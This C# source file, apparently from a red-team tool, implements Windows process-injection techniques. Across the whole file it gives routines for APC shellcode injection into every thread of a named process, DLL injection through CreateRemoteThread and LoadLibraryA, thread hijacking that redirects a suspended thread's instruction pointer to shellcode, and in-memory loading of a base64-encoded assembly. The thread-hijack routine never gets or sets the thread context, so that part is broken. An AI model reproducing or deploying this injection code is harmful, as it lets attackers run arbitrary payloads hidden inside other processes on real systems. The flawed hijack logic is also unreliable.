using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AddReferenceDotRedTeam
{
    public class Injection
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32")]
        internal static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        internal static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        internal static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        internal static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CloseHandle(IntPtr handle);

        [Flags]
        internal enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        internal enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        // x86 float save
        [StructLayout(LayoutKind.Sequential)]
        internal struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        // x86 context structure (not used in this example)
        [StructLayout(LayoutKind.Sequential)]
        internal struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value 
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS 
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT 
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS 
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER 
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL 
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        // x64 m128a
        [StructLayout(LayoutKind.Sequential)]
        internal struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        // x64 save format
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        internal struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        // x64 context structure
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        internal struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public static void Process_Inject(string Process_Name,byte[] ShellCode)
        {

        UInt32 MEM_COMMIT = 0x1000;
        UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        UInt32 PAGE_READWRITE = 0x04;
        UInt32 PAGE_EXECUTE_READ = 0x20;

        Process targetProcess = Process.GetProcessesByName(Process_Name)[0];
            IntPtr procHandle = OpenProcess(0x0008 | 0x0020 | 0x0010, false, targetProcess.Id);

            // Allocate memory within process and write shellcode
            IntPtr resultPtr = VirtualAllocEx(procHandle, IntPtr.Zero, ShellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(procHandle, resultPtr, ShellCode, ShellCode.Length, out bytesWritten);

            // Modify memory permissions on shellcode from XRW to XR
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(procHandle, resultPtr, ShellCode.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Iterate over threads and queueapc
            foreach (ProcessThread thread in targetProcess.Threads)
            {
                //Get handle to thread
                IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);

                //Assign APC to thread to execute shellcode
                IntPtr ptr = QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
            }
        }      

        public static void DLL_Inject(string Process_Name,string DLL_Path_and_Name)
        {
            // Get process id
            Process targetProcess = Process.GetProcessesByName(Process_Name)[0];

            // Get handle of the process - with required privileges
            IntPtr procHandle = OpenProcess(0x0002 | 0x0400 | 0x0008 | 0x0020 | 0x0010, false, targetProcess.Id);

            // Get address of LoadLibraryA and store in a pointer
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // Path to dll that will be injected
            string dllName = DLL_Path_and_Name;

            // Allocate memory for dll path and store pointer
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), 0x00001000 | 0x00002000, 0x04);

            // Write path of dll to memory
            UIntPtr bytesWritten;
            bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // Read contents of memory
            int bytesRead = 0;
            byte[] buffer = new byte[24];
            ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);

            // Create a thread that will call LoadLibraryA with allocMemAddress as argument
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        public static void Thread_HiJack(string Process_Name, byte[] payload)
        {
            // Process privileges
            const int PROCESS_CREATE_THREAD = 0x0002;
            const int PROCESS_QUERY_INFORMATION = 0x0400;
            const int PROCESS_VM_OPERATION = 0x0008;
            const int PROCESS_VM_WRITE = 0x0020;
            const int PROCESS_VM_READ = 0x0010;
            // Memory permissions
            const uint MEM_COMMIT = 0x00001000;
            const uint MEM_RESERVE = 0x00002000;
            const uint PAGE_READWRITE = 4;
            const uint PAGE_EXECUTE_READWRITE = 0x40;

            Process targetProcess = Process.GetProcessesByName(Process_Name)[0];

            ProcessThread pT = targetProcess.Threads[0];
            Console.WriteLine("ThreadId: " + targetProcess.Threads[0].Id);
            IntPtr pOpenThread = OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)pT.Id);
            SuspendThread(pOpenThread);

            CONTEXT64 tContext = new CONTEXT64();
            tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;

            // Once shellcode has executed return to thread original EIP address (mov to rax then jmp to address)
            byte[] mov_rax = new byte[2] {
            0x48, 0xb8};
            byte[] jmp_address = BitConverter.GetBytes(tContext.Rip);
            byte[] jmp_rax = new byte[2] {
            0xff, 0xe0};

            // Build shellcode
            byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
            payload.CopyTo(shellcode, 0);
            mov_rax.CopyTo(shellcode, payload.Length);
            jmp_address.CopyTo(shellcode, payload.Length + mov_rax.Length);
            jmp_rax.CopyTo(shellcode, payload.Length + mov_rax.Length + jmp_address.Length);

            // OpenProcess to allocate memory
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            // Allocate memory for shellcode within process
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), 0x00001000 | 0x00002000, 0x40);

            // Write shellcode within process
            UIntPtr bytesWritten;
            bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // Read memory to view shellcode
            int bytesRead = 0;
            byte[] buffer = new byte[shellcode.Length];
            ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);

            // Set context EIP to location of shellcode
            tContext.Rip = (ulong)allocMemAddress.ToInt64();

            // Apply new context to suspended thread
            // Resume the thread, redirecting execution to shellcode, then back to original process
            ResumeThread(pOpenThread);
        }

        public static void Assembly_Inject(string assemblyB64)
        {
            var bytes = Convert.FromBase64String(assemblyB64);
            var assembly = Assembly.Load(bytes);

            foreach (var type in assembly.GetTypes())
            {
                object instance = Activator.CreateInstance(type);
                object[] args = new object[] { new string[] { "" } };
                try
                {
                    type.GetMethod("Main").Invoke(instance, args);
                }
                catch { }
            }
        }
    }
}
